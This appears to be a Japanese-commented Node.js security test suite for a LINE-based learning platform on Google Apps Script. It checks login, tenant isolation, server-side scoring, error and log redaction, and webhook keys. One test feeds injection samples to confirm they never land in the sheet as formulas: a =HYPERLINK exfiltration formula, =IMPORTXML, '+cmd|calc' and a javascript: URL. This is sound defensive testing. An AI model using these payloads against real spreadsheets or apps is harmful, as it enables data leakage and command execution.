// だれが、どの操作をできるか。外の文字がシートに式のまま入らないか。ボットの返事が LINE に受けつけられる形か。
// q-oqrn の tools/qtest/fake-gas.js（GAS の偽物）の上で、src をそのまま動かして確かめる。
// 動かし方：node --test services/gas/test（q-oqrn がとなりのフォルダにあること）
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");

const FAKE_GAS = path.join(__dirname, "../../../../q-oqrn/tools/qtest/fake-gas.js");
const HAS_FAKE_GAS = fs.existsSync(FAKE_GAS);
const { createGas, response } = HAS_FAKE_GAS ? require(FAKE_GAS) : {};
const t = HAS_FAKE_GAS ? test : test.skip;

const TENANT_A = "tenant_demo_001"; // ふだんの教室
const TENANT_B = "tenant_other_002"; // ほかの教室
const SYSTEM_ADMIN = "Usystemadmin";
const WEBHOOK_KEY = "hook-secret-for-test";
const TODAY = new Date(Date.now() + 9 * 3600e3).toISOString().slice(0, 10);

// ID トークンは「token:<LINE のユーザー ID>」。偽物の LINE がその人だと答える。ほかは断る
function verifyFetch(url, opt) {
  if (/oauth2\/v2\.1\/verify/.test(url)) {
    const token = String((opt.payload && opt.payload.id_token) || "");
    const m = token.match(/^token:(U\w+)(?::(.*))?$/);
    if (!m) return response(400, { error: "invalid_request", error_description: "IdToken expired." });
    return response(200, { sub: m[1], name: m[2] || "なまえ", picture: "https://profile.line-scdn.net/x" });
  }
  return undefined;
}

function add(gas, sheet, record) {
  const sh = gas.sheet(sheet);
  const headers = sh.rows[0];
  sh.rows.push(headers.map((h) => (record[h] === undefined ? "" : record[h])));
}

function make(extraProps = {}) {
  const gas = createGas({
    dir: path.join(__dirname, "../src"),
    properties: Object.assign({
      SPREADSHEET_ID: "SPREADSHEET_TEST",
      LIFF_ID: "2011071914-test",
      LINE_CHANNEL_ACCESS_TOKEN: "test-token",
      APP_BASE_URL: "https://katsuan.github.io/line-learning-platform/",
      DEFAULT_TENANT_ID: TENANT_A,
      SYSTEM_ADMIN_LINE_USER_ID: SYSTEM_ADMIN
    }, extraProps),
    fetch: verifyFetch
  });
  gas.call("setupLearningPlatformSheets");

  add(gas, "tenants", { tenant_id: TENANT_A, name: "A 教室" });
  add(gas, "tenants", { tenant_id: TENANT_B, name: "B 教室" });
  [
    ["user_teacher", "Uteacher", "先生A"],
    ["user_l1", "Ulearner1", "学習者1"],
    ["user_l2", "Ulearner2", "学習者2"],
    ["user_b", "Ulearnerb", "学習者B"],
    ["user_teacher_b", "Uteacherb", "先生B"]
  ].forEach(([id, line, name]) => add(gas, "users", { user_id: id, line_user_id: line, display_name: name, status: "ACTIVE" }));
  [
    ["m_teacher", TENANT_A, "user_teacher", "ADMIN"],
    ["m_l1", TENANT_A, "user_l1", "LEARNER"],
    ["m_l2", TENANT_A, "user_l2", "LEARNER"],
    ["m_b", TENANT_B, "user_b", "LEARNER"],
    ["m_teacher_b", TENANT_B, "user_teacher_b", "OWNER"]
  ].forEach(([id, tenant, user, role]) => add(gas, "memberships", { membership_id: id, tenant_id: tenant, user_id: user, role, status: "ACTIVE" }));

  [["q1", "TEXT_EXACT", { exact: "apple" }, ""], ["q2", "NUMBER", { exact: 3 }, 0]].forEach(([id, type, answer, tol]) => {
    add(gas, "questions", { question_id: id, tenant_id: TENANT_A, course_id: "c1", question_type: type, grading_type: "AUTO", question_text: id + " の問題", status: "ACTIVE" });
    add(gas, "question_grading_configs", { question_grading_config_id: "g_" + id, tenant_id: TENANT_A, question_id: id, correct_answer_payload: JSON.stringify(answer), tolerance: tol, max_score: 1 });
  });
  add(gas, "questions", { question_id: "qb", tenant_id: TENANT_B, course_id: "cb", question_type: "TEXT_EXACT", question_text: "B の問題", status: "ACTIVE" });

  // 学習者2の今日の回（ほかの人のデータ）
  add(gas, "learning_sessions", { learning_session_id: "session_l2", tenant_id: TENANT_A, user_id: "user_l2", membership_id: "m_l2", session_type: "DAILY", status: "CREATED", question_count: 2, business_date: TODAY });
  add(gas, "session_questions", { session_question_id: "sq_l2_1", tenant_id: TENANT_A, learning_session_id: "session_l2", question_id: "q1", display_order: 1 });
  add(gas, "session_questions", { session_question_id: "sq_l2_2", tenant_id: TENANT_A, learning_session_id: "session_l2", question_id: "q2", display_order: 2 });
  add(gas, "answer_events", { answer_event_id: "ae_l2", tenant_id: TENANT_A, learning_session_id: "session_l2", session_question_id: "sq_l2_1", question_id: "q1", user_id: "user_l2", membership_id: "m_l2", idempotency_key: "k_l2", answer_payload: JSON.stringify({ value: "学習者2のひみつの答え" }), is_correct: "true", score: 1, answered_at: "2026-10-23T01:00:00Z" });
  gas.reset();
  return gas;
}

const call = (gas, action, body = {}, parameter = {}) => gas.doPost(Object.assign({ action }, body), { parameter });
const code = (res) => (res && res.error ? res.error.code : "ok");
const LEARNER_ACTIONS = ["getMe", "getHome", "bootstrapLearning", "resolveDailySession", "createAnswerEvent", "createShareReceipt"];
const ADMIN_ACTIONS = ["listAdminLearners", "getAdminLearnerDetail"];
const ADMIN_BODY = { membershipId: "m_l2" };

// ---- 本人確認 ----

t("学習者の操作：本人確認なし・確かめられないトークン・ほかの人の ID を名乗っても断る", () => {
  const gas = make();
  const tries = {
    "トークンなし": {},
    "確かめられないトークン": { lineIdToken: "expired" },
    "userId などを名乗る": { lineUserId: "Ulearner2", userId: "user_l2", membershipId: "m_l2", learnerId: "m_l2" }
  };
  for (const action of LEARNER_ACTIONS) {
    for (const [label, body] of Object.entries(tries)) {
      const res = call(gas, action, Object.assign({ learningSessionId: "session_l2", sessionQuestionId: "sq_l2_1", idempotencyKey: "x" }, body));
      assert.equal(code(res), "login_required", `${action}（${label}）`);
      assert.doesNotMatch(JSON.stringify(res), /学習者2|Ulearner2|ひみつ/, `${action}（${label}）でほかの人の中身が出ない`);
    }
  }
  assert.equal(gas.rows("answer_events").length, 2, "答えは増えない");
  assert.equal(gas.rows("users").length, 6, "人は増えない");
});

t("GET で ID トークンを URL に付けても使わない（URL はログに残るため）", () => {
  const gas = make();
  const res = gas.doGet({ action: "getMe", lineIdToken: "token:Ulearner1" });
  assert.equal(code(res), "login_required");
});

t("管理の操作：本人確認なし・確かめられない・学習者・ほかの教室の管理者は断る", () => {
  const gas = make();
  for (const action of ADMIN_ACTIONS) {
    const table = [
      ["トークンなし", {}, "admin_login_required"],
      ["確かめられないトークン", { lineIdToken: "expired" }, "admin_login_required"],
      ["学習者", { lineIdToken: "token:Ulearner1" }, "admin_only"],
      ["初めての人", { lineIdToken: "token:Unewcomer" }, "admin_only"],
      ["ほかの教室の管理者", { lineIdToken: "token:Uteacherb" }, "admin_only"],
      ["A の管理者が B を名乗る", { lineIdToken: "token:Uteacher", tenantId: TENANT_B }, "admin_only"]
    ];
    for (const [label, body, want] of table) {
      const res = call(gas, action, Object.assign({}, ADMIN_BODY, body));
      assert.equal(code(res), want, `${action}（${label}）`);
      assert.doesNotMatch(JSON.stringify(res), /学習者[12B]|Ulearner/, `${action}（${label}）で名前が出ない`);
    }
  }
});

t("管理者は自分の教室の学習者だけ見られる。LINE のユーザー ID は返さない", () => {
  const gas = make();
  const list = call(gas, "listAdminLearners", { lineIdToken: "token:Uteacher" });
  assert.deepEqual(list.learners.map((l) => l.displayName).sort(), ["先生A", "学習者1", "学習者2"].sort());
  const detail = call(gas, "getAdminLearnerDetail", { lineIdToken: "token:Uteacher", membershipId: "m_l2" });
  assert.equal(detail.learner.user.display_name, "学習者2");
  assert.doesNotMatch(JSON.stringify(detail), /Ulearner2/);
  // ほかの教室の学習者は見えない
  const other = call(gas, "getAdminLearnerDetail", { lineIdToken: "token:Uteacher", membershipId: "m_b" });
  assert.equal(code(other), "membership_not_found");
  // システム管理者は見られる
  assert.ok(call(gas, "listAdminLearners", { lineIdToken: "token:" + SYSTEM_ADMIN }).learners.length >= 3);
});

// ---- ほかの人・ほかの教室 ----

t("ほかの人の回に、答え・提出コードを作れない", () => {
  const gas = make();
  const me = { lineIdToken: "token:Ulearner1" };
  const answer = call(gas, "createAnswerEvent", Object.assign({ learningSessionId: "session_l2", sessionQuestionId: "sq_l2_1", questionId: "q1", idempotencyKey: "evil", answerPayload: { value: "x" }, isCorrect: true }, me));
  assert.equal(code(answer), "learning_session_not_found");
  // 同じ鍵（idempotencyKey）を当てても、ほかの人の答えの ID は返らない
  const dup = call(gas, "createAnswerEvent", Object.assign({ learningSessionId: "session_l2", sessionQuestionId: "sq_l2_1", idempotencyKey: "k_l2" }, me));
  assert.equal(code(dup), "learning_session_not_found");
  const receipt = call(gas, "createShareReceipt", Object.assign({ learningSessionId: "session_l2" }, me));
  assert.equal(code(receipt), "learning_session_not_found");
  assert.equal(gas.rows("answer_events").length, 2);
  assert.equal(gas.rows("share_receipts").length, 1);
});

t("自分の回でも、その回にない問題には答えを残せない", () => {
  const gas = make();
  const me = { lineIdToken: "token:Ulearner1" };
  const session = call(gas, "resolveDailySession", me).session;
  const res = call(gas, "createAnswerEvent", Object.assign({ learningSessionId: session.sessionId, sessionQuestionId: "sq_l2_1", idempotencyKey: "k1", answerPayload: { value: "apple" } }, me));
  assert.equal(code(res), "session_question_not_found");
});

t("自分のホームには、自分の答えだけが出る", () => {
  const gas = make();
  const home = call(gas, "getHome", { lineIdToken: "token:Ulearner2" });
  assert.equal(home.todayAnswerEvents.length, 1);
  const mine = call(gas, "getHome", { lineIdToken: "token:Ulearner1" });
  assert.doesNotMatch(JSON.stringify(mine), /ひみつ|session_l2/);
});

t("ほかの教室は、入っていない人には使えない（自分で入ることもできない）", () => {
  const gas = make();
  for (const action of LEARNER_ACTIONS) {
    const res = call(gas, action, { lineIdToken: "token:Ulearner1", learningSessionId: "x", sessionQuestionId: "y", idempotencyKey: "z" }, { tenantId: TENANT_B });
    assert.equal(code(res), "not_member", action);
  }
  const res = call(gas, "getHome", { lineIdToken: "token:Unewcomer", tenantId: TENANT_B });
  assert.equal(code(res), "not_member");
  assert.equal(gas.rows("memberships").length, 6, "メンバーは増えない");
  // B の人は B で使える
  assert.equal(code(call(gas, "getMe", { lineIdToken: "token:Ulearnerb", tenantId: TENANT_B })), "ok");
});

t("初めての人は、ふだんの教室に学習者として入る（管理者にはならない）", () => {
  const gas = make({ DEFAULT_MEMBERSHIP_ROLE: "ADMIN" });
  const me = call(gas, "getMe", { lineIdToken: "token:Unewcomer:あたらしい人" });
  assert.equal(me.membership.role, "LEARNER");
  assert.equal(me.user.display_name, "あたらしい人");
  // 2回目は同じ人
  const again = call(gas, "getMe", { lineIdToken: "token:Unewcomer" });
  assert.equal(again.user.user_id, me.user.user_id);
  assert.equal(code(call(gas, "listAdminLearners", { lineIdToken: "token:Unewcomer" })), "admin_only");
});

// ---- 正誤と点数 ----

t("正誤と点数はサーバーで決める（画面が「正解」と送っても、ちがう答えは不正解）", () => {
  const gas = make();
  const me = { lineIdToken: "token:Ulearner1" };
  const session = call(gas, "resolveDailySession", me).session;
  const [q1, q2] = session.questions;
  const wrong = call(gas, "createAnswerEvent", Object.assign({ learningSessionId: session.sessionId, sessionQuestionId: q1.sessionQuestionId, idempotencyKey: "a1", answerPayload: { value: "banana" }, isCorrect: true, score: 100 }, me));
  assert.equal(wrong.isCorrect, false);
  const right = call(gas, "createAnswerEvent", Object.assign({ learningSessionId: session.sessionId, sessionQuestionId: q2.sessionQuestionId, idempotencyKey: "a2", answerPayload: { value: 3 }, isCorrect: false }, me));
  assert.equal(right.isCorrect, true);
  const rows = gas.rows("answer_events");
  const head = rows[0];
  const last2 = rows.slice(-2).map((r) => Object.fromEntries(head.map((h, i) => [h, r[i]])));
  assert.deepEqual(last2.map((r) => [r.is_correct, r.score]), [["false", 0], ["true", 1]]);
  // 提出コードの点数も、残った答えから数える
  const receipt = call(gas, "createShareReceipt", Object.assign({ learningSessionId: session.sessionId, totalQuestions: 2, correctCount: 2, accuracyRate: 100 }, me)).receipt;
  assert.equal(receipt.correctCount, 1);
  assert.equal(receipt.accuracyRate, 50);
});

// ---- だれでも呼べるもの ----

t("health と getSetupStatus は、個人の情報・ID・人数を返さない", () => {
  const gas = make();
  for (const action of ["health", "getSetupStatus"]) {
    const text = JSON.stringify(call(gas, action));
    assert.doesNotMatch(text, /学習者|先生|U[a-z]+\d?|user_|membership_|sheetCounts/, action);
  }
});

t("思わぬエラーの中身は返さない", () => {
  const gas = make();
  // qcheck-ok: W2 テストの中で、偽物の GAS にわざとエラーを起こさせるだけ
  gas.eval("HealthUsecase.execute = function () { throw new Error('secret detail SPREADSHEET_TEST'); }");
  const res = call(gas, "health");
  assert.equal(res.error.code, "internal_error");
  assert.doesNotMatch(JSON.stringify(res), /secret|SPREADSHEET/);
  // LINE の確かめの返事（中身）も返さない
  const bad = call(gas, "getMe", { lineIdToken: "expired" });
  assert.doesNotMatch(JSON.stringify(bad), /IdToken expired/);
});

// ---- シート ----

t("外の文字は、式のままシートに入らない", () => {
  const gas = make();
  const evil = '=HYPERLINK("https://example.com/?"&A1,"x")';
  // qcheck-ok: W8 外から来る悪い文字の見本（画面の小窓は使っていない）
  const me = { lineIdToken: "token:Uevil:" + evil, lineDisplayName: evil, linePhotoUrl: "javascript:alert(1)" };
  const session = call(gas, "resolveDailySession", me).session;
  call(gas, "createAnswerEvent", Object.assign({ learningSessionId: session.sessionId, sessionQuestionId: session.questions[0].sessionQuestionId, idempotencyKey: "+cmd|calc", answerPayload: { value: "@SUM(1)" } }, me));
  call(gas, "createShareReceipt", Object.assign({ learningSessionId: session.sessionId, shareChannel: "-2+3" }, me));
  gas.lineEvent({ type: "message", replyToken: "r", source: { type: "user", userId: "Uevil" }, message: { type: "text", text: "=IMPORTXML(\"https://example.com\",\"//a\") 学習" } });
  assert.deepEqual(gas.formulaCells(), []);
  const users = gas.rows("users");
  const added = users[users.length - 1];
  assert.equal(added[users[0].indexOf("photo_url")], "https://profile.line-scdn.net/x");
});

t("長すぎる名前は切る", () => {
  const gas = make();
  const me = call(gas, "getMe", { lineIdToken: "token:Ulong:" + "あ".repeat(500) });
  assert.equal(me.user.display_name.length, 60);
});

t("debug_logs に LINE のユーザー ID と送られた文をそのまま残さない", () => {
  const gas = make();
  gas.lineEvent({ type: "message", replyToken: "r", source: { type: "user", userId: "Ulearner1" }, message: { type: "text", text: "成績を見せて 090-1234-5678" } });
  call(gas, "getMe", { lineIdToken: "token:Ulearner1" });
  const text = JSON.stringify(gas.rows("debug_logs"));
  assert.doesNotMatch(text, /Ulearner1|090-1234/);
  assert.match(text, /sha256:/);
});

// ---- LINE の Webhook ----

t("Webhook：WEBHOOK_KEY を入れたら、合言葉が合わない知らせには何もしない", () => {
  const gas = make({ WEBHOOK_KEY });
  const event = { type: "message", replyToken: "r", source: { type: "user", userId: "Ulearner1" }, message: { type: "text", text: "5問" } };
  gas.lineEvent(event);
  gas.lineEvent(event, { key: "wrong" });
  assert.equal(gas.replies().length, 0);
  gas.lineEvent(event, { key: WEBHOOK_KEY });
  assert.equal(gas.replies().length, 1);
});

t("ボットの返事は、LINE が受けつける形（ふつうの人・管理者・友だち追加）", () => {
  const gas = make();
  const texts = ["5問", "記録", "ヘルプ", "導入相談", "管理", "メニュー"];
  for (const userId of ["Ulearner1", SYSTEM_ADMIN]) {
    for (const text of texts) {
      gas.lineEvent({ type: "message", replyToken: "r", source: { type: "user", userId }, message: { type: "text", text } });
    }
  }
  gas.lineEvent({ type: "follow", replyToken: "r", source: { type: "user", userId: "Unew" } });
  assert.ok(gas.replies().length >= texts.length * 2);
  assert.deepEqual(gas.flexProblems().filter((p) => p.level === "error"), []);
  // ふつうの人には、管理の画面の案内を出さない
  gas.reset();
  gas.lineEvent({ type: "message", replyToken: "r", source: { type: "user", userId: "Ulearner1" }, message: { type: "text", text: "管理" } });
  assert.doesNotMatch(JSON.stringify(gas.replies()), /admin\.html/);
});

t("使う前の確かめ（Q_SELF_CHECK のカード）は、LINE が受けつける形", () => {
  const gas = make();
  const { checkMessages } = require(FAKE_GAS);
  // qcheck-ok: W2 テストの中で、偽物の GAS の値を読むだけ
  const cards = gas.eval("Q_SELF_CHECK.cards()");
  assert.ok(cards.length >= 5);
  assert.deepEqual(checkMessages(cards).filter((p) => p.level === "error"), []);
  // qcheck-ok: W2 テストの中で、偽物の GAS の値を読むだけ
  assert.equal(gas.eval("typeof qCheckAll"), "function");
});

t("LINE が断ったときの中身は、呼んだ人に返さない（原因は LAST_LINE_ERRORS に残る）", () => {
  const gas = createGas({
    dir: path.join(__dirname, "../src"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", DEFAULT_TENANT_ID: TENANT_A },
    fetch: (url) => (/message\/reply/.test(url) ? response(400, { message: "Invalid reply token" }) : undefined)
  });
  gas.call("setupLearningPlatformSheets");
  const res = gas.lineEvent({ type: "message", replyToken: "r", source: { type: "user", userId: "U1" }, message: { type: "text", text: "ヘルプ" } });
  assert.doesNotMatch(JSON.stringify(res), /Invalid reply token/);
  assert.match(gas.properties.LAST_LINE_ERRORS, /Invalid reply token/);
});
